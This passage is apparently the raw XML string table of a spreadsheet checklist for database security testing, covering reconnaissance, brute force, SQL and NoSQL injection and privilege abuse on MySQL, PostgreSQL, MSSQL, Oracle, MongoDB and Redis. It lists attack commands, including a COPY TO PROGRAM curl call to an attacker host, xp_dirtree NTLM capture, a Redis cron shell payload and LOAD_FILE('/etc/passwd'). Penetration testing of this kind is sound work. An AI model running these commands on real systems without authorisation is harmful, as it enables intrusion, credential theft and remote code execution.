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base Security Tests" sheetId="2" state="visible" r:id="rId4"/>
  </sheets>
  <definedNames>
    <definedName function="false" hidden="true" localSheetId="1" name="_xlnm._FilterDatabase" vbProcedure="false">'Database Security Tests'!$A$1:$K$101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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1035" uniqueCount="493">
  <si>
    <t xml:space="preserve">Database Security Testing - Comprehensive Summary</t>
  </si>
  <si>
    <t xml:space="preserve">Severity Distribution</t>
  </si>
  <si>
    <t xml:space="preserve">Count</t>
  </si>
  <si>
    <t xml:space="preserve">Percentage</t>
  </si>
  <si>
    <t xml:space="preserve">Critical</t>
  </si>
  <si>
    <t xml:space="preserve">High</t>
  </si>
  <si>
    <t xml:space="preserve">Medium</t>
  </si>
  <si>
    <t xml:space="preserve">Low</t>
  </si>
  <si>
    <t xml:space="preserve">Total Tests</t>
  </si>
  <si>
    <t xml:space="preserve">100%</t>
  </si>
  <si>
    <t xml:space="preserve">Testing Phase</t>
  </si>
  <si>
    <t xml:space="preserve">Network</t>
  </si>
  <si>
    <t xml:space="preserve">Database</t>
  </si>
  <si>
    <t xml:space="preserve">Application</t>
  </si>
  <si>
    <t xml:space="preserve">Cloud</t>
  </si>
  <si>
    <t xml:space="preserve">Documentation</t>
  </si>
  <si>
    <t xml:space="preserve">CVSS Score Range</t>
  </si>
  <si>
    <t xml:space="preserve">Critical (9.0-10.0)</t>
  </si>
  <si>
    <t xml:space="preserve">High (7.0-8.9)</t>
  </si>
  <si>
    <t xml:space="preserve">Medium (4.0-6.9)</t>
  </si>
  <si>
    <t xml:space="preserve">Low (0.1-3.9)</t>
  </si>
  <si>
    <t xml:space="preserve">Informational (0.0)</t>
  </si>
  <si>
    <t xml:space="preserve">ID</t>
  </si>
  <si>
    <t xml:space="preserve">Test Case</t>
  </si>
  <si>
    <t xml:space="preserve">Category</t>
  </si>
  <si>
    <t xml:space="preserve">Severity</t>
  </si>
  <si>
    <t xml:space="preserve">Phase</t>
  </si>
  <si>
    <t xml:space="preserve">Tools</t>
  </si>
  <si>
    <t xml:space="preserve">Notes</t>
  </si>
  <si>
    <t xml:space="preserve">Required Tools</t>
  </si>
  <si>
    <t xml:space="preserve">Command/Steps</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP Category</t>
  </si>
  <si>
    <t xml:space="preserve">CVSS Score</t>
  </si>
  <si>
    <t xml:space="preserve">Database Version Identification</t>
  </si>
  <si>
    <t xml:space="preserve">Reconnaissance</t>
  </si>
  <si>
    <t xml:space="preserve">nmap, metasploit, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Identify DB type and version</t>
  </si>
  <si>
    <t xml:space="preserve">nmap, nc</t>
  </si>
  <si>
    <t xml:space="preserve">nmap -sV -p3306,5432,1433,1521 target
nc -v target 3306
telnet target 1433</t>
  </si>
  <si>
    <t xml:space="preserve">A05:2021 - Security Misconfiguration</t>
  </si>
  <si>
    <t xml:space="preserve">0.0</t>
  </si>
  <si>
    <t xml:space="preserve">Database Port Scanning</t>
  </si>
  <si>
    <t xml:space="preserve">nmap, masscan</t>
  </si>
  <si>
    <t xml:space="preserve">Identify open database ports</t>
  </si>
  <si>
    <t xml:space="preserve">nmap -p1433,3306,5432,1521,27017,6379,9042,7000 target
masscan target -p1-65535 --rate=1000</t>
  </si>
  <si>
    <t xml:space="preserve">3.7</t>
  </si>
  <si>
    <t xml:space="preserve">Database Service Banner Grabbing</t>
  </si>
  <si>
    <t xml:space="preserve">nc, telnet, nmap</t>
  </si>
  <si>
    <t xml:space="preserve">Extract service information</t>
  </si>
  <si>
    <t xml:space="preserve">nc, nmap</t>
  </si>
  <si>
    <t xml:space="preserve">nc -v target 3306
nmap -sV --script=banner target -p3306</t>
  </si>
  <si>
    <t xml:space="preserve">Database Instance Enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">msf, nmap scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Enumerate DB instances</t>
  </si>
  <si>
    <t xml:space="preserve">nmap, msf</t>
  </si>
  <si>
    <t xml:space="preserve">nmap --script ms-sql-info target -p1433
use auxiliary/scanner/mssql/mssql_ping</t>
  </si>
  <si>
    <t xml:space="preserve">5.3</t>
  </si>
  <si>
    <t xml:space="preserve">DNS Enumeration for DB Servers</t>
  </si>
  <si>
    <t xml:space="preserve">dig, nslookup, dnsenum</t>
  </si>
  <si>
    <t xml:space="preserve">Find DB servers via DNS</t>
  </si>
  <si>
    <t xml:space="preserve">dig, nslookup</t>
  </si>
  <si>
    <t xml:space="preserve">dig @dns-server domain ANY
nslookup -type=SRV _mssql._tcp.domain
dnsenum domain</t>
  </si>
  <si>
    <t xml:space="preserve">Default Credentials Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Authentication</t>
  </si>
  <si>
    <t xml:space="preserve">hydra, metasploit, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test default username/password</t>
  </si>
  <si>
    <t xml:space="preserve">hydra, msf</t>
  </si>
  <si>
    <t xml:space="preserve">hydra -L users.txt -P pass.txt mysql://target
Test: root/root, sa/sa, admin/admin, postgres/postgres</t>
  </si>
  <si>
    <t xml:space="preserve">A07:2021 - ID &amp; Auth Failures</t>
  </si>
  <si>
    <t xml:space="preserve">9.8</t>
  </si>
  <si>
    <t xml:space="preserve">Weak Password Testing</t>
  </si>
  <si>
    <t xml:space="preserve">hydra, medusa, ncrack</t>
  </si>
  <si>
    <t xml:space="preserve">Brute force weak passwords</t>
  </si>
  <si>
    <t xml:space="preserve">hydra, medusa</t>
  </si>
  <si>
    <t xml:space="preserve">hydra -l admin -P rockyou.txt mysql://target
medusa -h target -u sa -P pass.txt -M mssql</t>
  </si>
  <si>
    <t xml:space="preserve">8.1</t>
  </si>
  <si>
    <t xml:space="preserve">Blank Password Testing</t>
  </si>
  <si>
    <t xml:space="preserve">hydra, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test for empty passwords</t>
  </si>
  <si>
    <t xml:space="preserve">hydra -l root -p '' mysql://target
mysql -h target -u root -p''
psql -h target -U postgres</t>
  </si>
  <si>
    <t xml:space="preserve">Password Policy Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Review password complexity requirements</t>
  </si>
  <si>
    <t xml:space="preserve">Database client</t>
  </si>
  <si>
    <t xml:space="preserve">SQL: SELECT * FROM sys.login_token
CHECK_POLICY validation
Review password aging</t>
  </si>
  <si>
    <t xml:space="preserve">6.5</t>
  </si>
  <si>
    <t xml:space="preserve">Account Lockout Policy Testing</t>
  </si>
  <si>
    <t xml:space="preserve">hydra, custom scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Test account lockout mechanism</t>
  </si>
  <si>
    <t xml:space="preserve">hydra</t>
  </si>
  <si>
    <t xml:space="preserve">Attempt multiple failed logins
Test lockout threshold
Check lockout duration</t>
  </si>
  <si>
    <t xml:space="preserve">Multi-Factor Authentication Check</t>
  </si>
  <si>
    <t xml:space="preserve">manual review</t>
  </si>
  <si>
    <t xml:space="preserve">Verify MFA implementation</t>
  </si>
  <si>
    <t xml:space="preserve">Manual</t>
  </si>
  <si>
    <t xml:space="preserve">Check for 2FA/MFA support
Test authentication flow
Review bypass methods</t>
  </si>
  <si>
    <t xml:space="preserve">Anonymous Access Testing</t>
  </si>
  <si>
    <t xml:space="preserve">database clients</t>
  </si>
  <si>
    <t xml:space="preserve">Test for anonymous login</t>
  </si>
  <si>
    <t xml:space="preserve">mysql, psql, sqlcmd</t>
  </si>
  <si>
    <t xml:space="preserve">mysql -h target -u anonymous
psql -h target -U public
Test guest/anonymous accounts</t>
  </si>
  <si>
    <t xml:space="preserve">Privilege Escalation Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Authorization</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, custom exploits</t>
  </si>
  <si>
    <t xml:space="preserve">Test for privilege escalation</t>
  </si>
  <si>
    <t xml:space="preserve">Attempt to elevate privileges
Test sudo/dba commands
Exploit misconfigured grants</t>
  </si>
  <si>
    <t xml:space="preserve">A01:2021 - Broken Access Control</t>
  </si>
  <si>
    <t xml:space="preserve">Excessive Privileges Enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries</t>
  </si>
  <si>
    <t xml:space="preserve">Identify over-privileged accounts</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM information_schema.user_privileges
SELECT * FROM sys.server_permissions
Audit grants</t>
  </si>
  <si>
    <t xml:space="preserve">Role and Permission Audit</t>
  </si>
  <si>
    <t xml:space="preserve">Review role assignments</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM mysql.user
SELECT * FROM pg_roles
exec sp_helprolemember</t>
  </si>
  <si>
    <t xml:space="preserve">Public/Guest Role Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Check public role permissions</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM sys.database_permissions WHERE grantee_principal_id = 0
Review public grants</t>
  </si>
  <si>
    <t xml:space="preserve">Cross-Database Access Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test access to other databases</t>
  </si>
  <si>
    <t xml:space="preserve">USE other_database
SELECT * FROM other_db.table
Test cross-database queries</t>
  </si>
  <si>
    <t xml:space="preserve">7.5</t>
  </si>
  <si>
    <t xml:space="preserve">OS Command Execution Testing</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, xp_cmdshell</t>
  </si>
  <si>
    <t xml:space="preserve">Test for OS command execution</t>
  </si>
  <si>
    <t xml:space="preserve">sqlcmd, mysql</t>
  </si>
  <si>
    <t xml:space="preserve">EXEC xp_cmdshell 'whoami'
SELECT sys_exec('id')
Test UDF execution</t>
  </si>
  <si>
    <t xml:space="preserve">A03:2021 - Injection</t>
  </si>
  <si>
    <t xml:space="preserve">Classic SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">Injection</t>
  </si>
  <si>
    <t xml:space="preserve">SQLMap, Burp Suite, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test for basic SQL injection</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap, Burp</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap -u 'http://target/page?id=1' --dbs
Test: ' OR '1'='1, 1' OR '1'='1'--</t>
  </si>
  <si>
    <t xml:space="preserve">Blind SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">SQLMap, Burp Suite</t>
  </si>
  <si>
    <t xml:space="preserve">Test for blind SQL injection</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap -u 'url' --technique=B
Test: 1' AND SLEEP(5)--
1' AND (SELECT * FROM users) --</t>
  </si>
  <si>
    <t xml:space="preserve">9.1</t>
  </si>
  <si>
    <t xml:space="preserve">Time-Based SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">SQLMap, custom scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Test time-based injection</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap -u 'url' --technique=T
Test: 1'; WAITFOR DELAY '00:00:05'--
1' AND SLEEP(5)#</t>
  </si>
  <si>
    <t xml:space="preserve">Error-Based SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">SQLMap, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test error-based injection</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap, manual</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap -u 'url' --technique=E
Test: 1' AND 1=CONVERT(int,(SELECT @@version))--</t>
  </si>
  <si>
    <t xml:space="preserve">Union-Based SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">Test UNION-based injection</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap -u 'url' --technique=U
Test: 1' UNION SELECT null,@@version--</t>
  </si>
  <si>
    <t xml:space="preserve">Second-Order SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">manual testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test for stored SQLi</t>
  </si>
  <si>
    <t xml:space="preserve">Manual, Burp</t>
  </si>
  <si>
    <t xml:space="preserve">Insert malicious payload
Trigger in different context
Monitor for execution</t>
  </si>
  <si>
    <t xml:space="preserve">Stored Procedure SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">Test stored procedures</t>
  </si>
  <si>
    <t xml:space="preserve">Test SP parameters for injection
EXEC sp_test '1'' OR ''1''=''1'
Bypass SP validation</t>
  </si>
  <si>
    <t xml:space="preserve">ORM SQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">manual testing, SQLMap</t>
  </si>
  <si>
    <t xml:space="preserve">Test ORM-generated queries</t>
  </si>
  <si>
    <t xml:space="preserve">Manual, sqlmap</t>
  </si>
  <si>
    <t xml:space="preserve">Test Entity Framework, Hibernate, Django ORM
Parameter pollution
HQL/JPQL injection</t>
  </si>
  <si>
    <t xml:space="preserve">MongoDB NoSQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">NoSQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">NoSQLMap, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test MongoDB injection</t>
  </si>
  <si>
    <t xml:space="preserve">NoSQLMap -u 'url'
Test: {$gt: ''}, {$ne: null}
JSON injection: {"$where": "1==1"}</t>
  </si>
  <si>
    <t xml:space="preserve">Redis Command Injection</t>
  </si>
  <si>
    <t xml:space="preserve">redis-cli, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test Redis injection</t>
  </si>
  <si>
    <t xml:space="preserve">redis-cli</t>
  </si>
  <si>
    <t xml:space="preserve">redis-cli -h target
Test: FLUSHALL, CONFIG SET dir /var/www/
Lua script injection</t>
  </si>
  <si>
    <t xml:space="preserve">CouchDB Injection</t>
  </si>
  <si>
    <t xml:space="preserve">curl, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test CouchDB injection</t>
  </si>
  <si>
    <t xml:space="preserve">curl</t>
  </si>
  <si>
    <t xml:space="preserve">curl -X GET 'http://target:5984/_all_dbs'
Test view injection
MapReduce injection</t>
  </si>
  <si>
    <t xml:space="preserve">Cassandra CQL Injection</t>
  </si>
  <si>
    <t xml:space="preserve">cqlsh, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test CQL injection</t>
  </si>
  <si>
    <t xml:space="preserve">cqlsh</t>
  </si>
  <si>
    <t xml:space="preserve">cqlsh target
Test CQL query injection
Prepared statement bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Sensitive Data Discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Data Exposure</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, grep</t>
  </si>
  <si>
    <t xml:space="preserve">Find PII and sensitive data</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM information_schema.columns WHERE column_name LIKE '%password%'
Search for SSN, CC, PII</t>
  </si>
  <si>
    <t xml:space="preserve">M2 - Insecure Data Storage</t>
  </si>
  <si>
    <t xml:space="preserve">Unencrypted Data at Rest</t>
  </si>
  <si>
    <t xml:space="preserve">Encryption</t>
  </si>
  <si>
    <t xml:space="preserve">file analysis, queries</t>
  </si>
  <si>
    <t xml:space="preserve">Check for encryption at rest</t>
  </si>
  <si>
    <t xml:space="preserve">Check TDE status
Review encryption settings
Analyze data files</t>
  </si>
  <si>
    <t xml:space="preserve">A02:2021 - Cryptographic Failures</t>
  </si>
  <si>
    <t xml:space="preserve">Unencrypted Data in Transit</t>
  </si>
  <si>
    <t xml:space="preserve">Wireshark, tcpdump</t>
  </si>
  <si>
    <t xml:space="preserve">Check for SSL/TLS</t>
  </si>
  <si>
    <t xml:space="preserve">tcpdump -i eth0 -A port 3306
wireshark -f 'port 1433'
Verify SSL enforcement</t>
  </si>
  <si>
    <t xml:space="preserve">M3 - Insecure Communication</t>
  </si>
  <si>
    <t xml:space="preserve">Weak Encryption Algorithms</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, config review</t>
  </si>
  <si>
    <t xml:space="preserve">Identify weak crypto</t>
  </si>
  <si>
    <t xml:space="preserve">Check for MD5, DES, RC4
Review encryption algorithms
Test cipher suites</t>
  </si>
  <si>
    <t xml:space="preserve">Backup File Security</t>
  </si>
  <si>
    <t xml:space="preserve">Backup</t>
  </si>
  <si>
    <t xml:space="preserve">file access, SQL queries</t>
  </si>
  <si>
    <t xml:space="preserve">Test backup file protection</t>
  </si>
  <si>
    <t xml:space="preserve">Manual, SQL</t>
  </si>
  <si>
    <t xml:space="preserve">Check backup encryption
Test backup file access
Review backup permissions</t>
  </si>
  <si>
    <t xml:space="preserve">Database Export Security</t>
  </si>
  <si>
    <t xml:space="preserve">export tools, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test data export controls</t>
  </si>
  <si>
    <t xml:space="preserve">mysqldump, pg_dump</t>
  </si>
  <si>
    <t xml:space="preserve">mysqldump -u user -p database
pg_dump dbname
Test export restrictions</t>
  </si>
  <si>
    <t xml:space="preserve">Dangerous Functions Enabled</t>
  </si>
  <si>
    <t xml:space="preserve">Configuration</t>
  </si>
  <si>
    <t xml:space="preserve">Check for dangerous features</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT @@version
SELECT * FROM pg_settings
Check xp_cmdshell, LOAD_FILE(), outfile</t>
  </si>
  <si>
    <t xml:space="preserve">Remote Access Configuration</t>
  </si>
  <si>
    <t xml:space="preserve">config review, netstat</t>
  </si>
  <si>
    <t xml:space="preserve">Review remote access settings</t>
  </si>
  <si>
    <t xml:space="preserve">Manual, netstat</t>
  </si>
  <si>
    <t xml:space="preserve">Check bind-address
Review pg_hba.conf
Test remote connections</t>
  </si>
  <si>
    <t xml:space="preserve">Audit Logging Configuration</t>
  </si>
  <si>
    <t xml:space="preserve">Verify audit logging</t>
  </si>
  <si>
    <t xml:space="preserve">Check audit settings
Review log configuration
Test log rotation</t>
  </si>
  <si>
    <t xml:space="preserve">A09:2021 - Logging Failures</t>
  </si>
  <si>
    <t xml:space="preserve">Error Message Verbosity</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, error testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test error disclosure</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger errors
Check error messages
Review error handling</t>
  </si>
  <si>
    <t xml:space="preserve">Default Configuration Testing</t>
  </si>
  <si>
    <t xml:space="preserve">config review</t>
  </si>
  <si>
    <t xml:space="preserve">Check for default settings</t>
  </si>
  <si>
    <t xml:space="preserve">Review my.cnf, postgresql.conf, mssql settings
Identify default configurations</t>
  </si>
  <si>
    <t xml:space="preserve">Database Link Security</t>
  </si>
  <si>
    <t xml:space="preserve">Test database links</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM sys.servers
SELECT * FROM dba_db_links
Test linked server access</t>
  </si>
  <si>
    <t xml:space="preserve">Stored Procedure Enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">Code Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">List stored procedures</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM information_schema.routines
exec sp_stored_procedures
\df in PostgreSQL</t>
  </si>
  <si>
    <t xml:space="preserve">4.3</t>
  </si>
  <si>
    <t xml:space="preserve">Dynamic SQL in Stored Procedures</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, code review</t>
  </si>
  <si>
    <t xml:space="preserve">Find dynamic SQL</t>
  </si>
  <si>
    <t xml:space="preserve">Review SP definitions
Search for EXEC(), sp_executesql
Test for injection</t>
  </si>
  <si>
    <t xml:space="preserve">Stored Procedure Privilege Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Check SP permissions</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM sys.fn_my_permissions('proc_name', 'OBJECT')
Review EXECUTE AS</t>
  </si>
  <si>
    <t xml:space="preserve">User-Defined Function Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Audit UDFs</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM mysql.func
Review UDF definitions
Test for malicious UDFs</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger Security Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Review trigger security</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM information_schema.triggers
Audit trigger permissions
Test trigger execution</t>
  </si>
  <si>
    <t xml:space="preserve">MySQL FILE Privilege Testing</t>
  </si>
  <si>
    <t xml:space="preserve">MySQL Specific</t>
  </si>
  <si>
    <t xml:space="preserve">mysql client</t>
  </si>
  <si>
    <t xml:space="preserve">Test FILE privilege abuse</t>
  </si>
  <si>
    <t xml:space="preserve">mysql</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM mysql.user WHERE File_priv='Y'
SELECT LOAD_FILE('/etc/passwd')
INTO OUTFILE '/tmp/test'</t>
  </si>
  <si>
    <t xml:space="preserve">MySQL UDF Exploitation</t>
  </si>
  <si>
    <t xml:space="preserve">mysql, Metasploit</t>
  </si>
  <si>
    <t xml:space="preserve">Test UDF-based exploitation</t>
  </si>
  <si>
    <t xml:space="preserve">mysql, msf</t>
  </si>
  <si>
    <t xml:space="preserve">use exploit/multi/mysql/mysql_udf_payload
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so'</t>
  </si>
  <si>
    <t xml:space="preserve">MySQL Secure File Priv Bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Test secure-file-priv bypass</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT @@secure_file_priv
SELECT @@global.secure_file_priv
Test directory traversal</t>
  </si>
  <si>
    <t xml:space="preserve">PostgreSQL COPY Command Testing</t>
  </si>
  <si>
    <t xml:space="preserve">PostgreSQL Specific</t>
  </si>
  <si>
    <t xml:space="preserve">psql</t>
  </si>
  <si>
    <t xml:space="preserve">Test COPY command abuse</t>
  </si>
  <si>
    <t xml:space="preserve">COPY (SELECT '') TO PROGRAM 'curl http://attacker'
COPY table TO '/tmp/dump.txt'</t>
  </si>
  <si>
    <t xml:space="preserve">PostgreSQL Large Object Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test large object access</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT lo_import('/etc/passwd')
SELECT lo_export(loid, '/tmp/file')</t>
  </si>
  <si>
    <t xml:space="preserve">PostgreSQL Extension Security</t>
  </si>
  <si>
    <t xml:space="preserve">Test extension abuse</t>
  </si>
  <si>
    <t xml:space="preserve">CREATE EXTENSION adminpack
SELECT * FROM pg_available_extensions
Test dblink</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQL xp_cmdshell Testing</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQL Specific</t>
  </si>
  <si>
    <t xml:space="preserve">sqlcmd, msf</t>
  </si>
  <si>
    <t xml:space="preserve">Test xp_cmdshell execution</t>
  </si>
  <si>
    <t xml:space="preserve">EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQL xp_dirtree Testing</t>
  </si>
  <si>
    <t xml:space="preserve">sqlcmd</t>
  </si>
  <si>
    <t xml:space="preserve">Test xp_dirtree for UNC injection</t>
  </si>
  <si>
    <t xml:space="preserve">EXEC xp_dirtree '\\attacker\share'
Capture NTLM hash
Relay attack</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQL Linked Server Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test linked server abuse</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM sys.servers
EXEC sp_addlinkedserver
Query via OPENQUERY</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQL TRUSTWORTHY Database</t>
  </si>
  <si>
    <t xml:space="preserve">Check TRUSTWORTHY setting</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT name, is_trustworthy_on FROM sys.databases
Test privilege escalation via TRUSTWORTHY</t>
  </si>
  <si>
    <t xml:space="preserve">Oracle TNS Poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">Oracle Specific</t>
  </si>
  <si>
    <t xml:space="preserve">Metasploit, custom</t>
  </si>
  <si>
    <t xml:space="preserve">Test TNS listener poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">msf, manual</t>
  </si>
  <si>
    <t xml:space="preserve">use auxiliary/admin/oracle/tnscmd
Test TNS listener commands
Poison registration</t>
  </si>
  <si>
    <t xml:space="preserve">Oracle Java Stored Procedure Testing</t>
  </si>
  <si>
    <t xml:space="preserve">sqlplus</t>
  </si>
  <si>
    <t xml:space="preserve">Test Java SP exploitation</t>
  </si>
  <si>
    <t xml:space="preserve">CREATE JAVA SOURCE
Test OS command execution
Java privilege escalation</t>
  </si>
  <si>
    <t xml:space="preserve">Oracle External Procedure Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test external procedures</t>
  </si>
  <si>
    <t xml:space="preserve">Test extproc configuration
Create external library
Test OS access</t>
  </si>
  <si>
    <t xml:space="preserve">MongoDB Authentication Bypass</t>
  </si>
  <si>
    <t xml:space="preserve">MongoDB Specific</t>
  </si>
  <si>
    <t xml:space="preserve">mongo client, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test authentication bypass</t>
  </si>
  <si>
    <t xml:space="preserve">mongo</t>
  </si>
  <si>
    <t xml:space="preserve">mongo --host target --port 27017
Test without credentials
Check --auth setting</t>
  </si>
  <si>
    <t xml:space="preserve">MongoDB JavaScript Injection</t>
  </si>
  <si>
    <t xml:space="preserve">mongo, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test JavaScript injection</t>
  </si>
  <si>
    <t xml:space="preserve">db.collection.find({$where: 'malicious code'})
Test eval injection
MapReduce injection</t>
  </si>
  <si>
    <t xml:space="preserve">MongoDB SSJI via $where</t>
  </si>
  <si>
    <t xml:space="preserve">Test $where injection</t>
  </si>
  <si>
    <t xml:space="preserve">db.collection.find({$where: '1==1'})
Test: this.password.match(/.*/)
Extract data via regex</t>
  </si>
  <si>
    <t xml:space="preserve">Redis Unauthenticated Access</t>
  </si>
  <si>
    <t xml:space="preserve">Redis Specific</t>
  </si>
  <si>
    <t xml:space="preserve">Test unauthorized access</t>
  </si>
  <si>
    <t xml:space="preserve">redis-cli -h target
KEYS *
GET sensitive_key
Test no password required</t>
  </si>
  <si>
    <t xml:space="preserve">Redis RCE via Cron/SSH</t>
  </si>
  <si>
    <t xml:space="preserve">Test Redis RCE techniques</t>
  </si>
  <si>
    <t xml:space="preserve">config set dir /var/spool/cron/
config set dbfilename root
set payload '* * * * * /bin/bash -i'</t>
  </si>
  <si>
    <t xml:space="preserve">Redis Module Loading</t>
  </si>
  <si>
    <t xml:space="preserve">Test malicious module loading</t>
  </si>
  <si>
    <t xml:space="preserve">MODULE LOAD /path/to/module.so
Test command execution via module</t>
  </si>
  <si>
    <t xml:space="preserve">SSL/TLS Certificate Validation</t>
  </si>
  <si>
    <t xml:space="preserve">Network Security</t>
  </si>
  <si>
    <t xml:space="preserve">openssl, nmap</t>
  </si>
  <si>
    <t xml:space="preserve">Test certificate security</t>
  </si>
  <si>
    <t xml:space="preserve">openssl s_client -connect target:3306
nmap --script ssl-cert target
Check self-signed certs</t>
  </si>
  <si>
    <t xml:space="preserve">7.4</t>
  </si>
  <si>
    <t xml:space="preserve">SSL/TLS Version Testing</t>
  </si>
  <si>
    <t xml:space="preserve">testssl.sh, nmap</t>
  </si>
  <si>
    <t xml:space="preserve">Test SSL/TLS versions</t>
  </si>
  <si>
    <t xml:space="preserve">testssl.sh target:3306
nmap --script ssl-enum-ciphers target
Test for SSLv3, TLS 1.0</t>
  </si>
  <si>
    <t xml:space="preserve">Man-in-the-Middle Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Burp, mitmproxy, ettercap</t>
  </si>
  <si>
    <t xml:space="preserve">Test MITM vulnerability</t>
  </si>
  <si>
    <t xml:space="preserve">ettercap, Burp</t>
  </si>
  <si>
    <t xml:space="preserve">ettercap -T -M arp -i eth0
Intercept database traffic
Test credential sniffing</t>
  </si>
  <si>
    <t xml:space="preserve">Network Segmentation Testing</t>
  </si>
  <si>
    <t xml:space="preserve">nmap, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test network isolation</t>
  </si>
  <si>
    <t xml:space="preserve">nmap, traceroute</t>
  </si>
  <si>
    <t xml:space="preserve">Test access from DMZ
Attempt connections from untrusted networks
Check firewall rules</t>
  </si>
  <si>
    <t xml:space="preserve">Resource Exhaustion Testing</t>
  </si>
  <si>
    <t xml:space="preserve">DoS</t>
  </si>
  <si>
    <t xml:space="preserve">custom scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Test resource limits</t>
  </si>
  <si>
    <t xml:space="preserve">Custom scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Flood with connections
Large query execution
Memory exhaustion</t>
  </si>
  <si>
    <t xml:space="preserve">A04:2021 - Insecure Design</t>
  </si>
  <si>
    <t xml:space="preserve">Regular Expression DoS (ReDoS)</t>
  </si>
  <si>
    <t xml:space="preserve">Test ReDoS in queries</t>
  </si>
  <si>
    <t xml:space="preserve">Test complex regex patterns
(a+)+b pattern
Cause CPU exhaustion</t>
  </si>
  <si>
    <t xml:space="preserve">Connection Pool Exhaustion</t>
  </si>
  <si>
    <t xml:space="preserve">Test connection limits</t>
  </si>
  <si>
    <t xml:space="preserve">Python, scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Open max connections
Hold connections
Deny legitimate access</t>
  </si>
  <si>
    <t xml:space="preserve">Password Storage Security</t>
  </si>
  <si>
    <t xml:space="preserve">Compliance</t>
  </si>
  <si>
    <t xml:space="preserve">Verify password hashing</t>
  </si>
  <si>
    <t xml:space="preserve">Check hash algorithms
Test for plaintext passwords
Review salt usage</t>
  </si>
  <si>
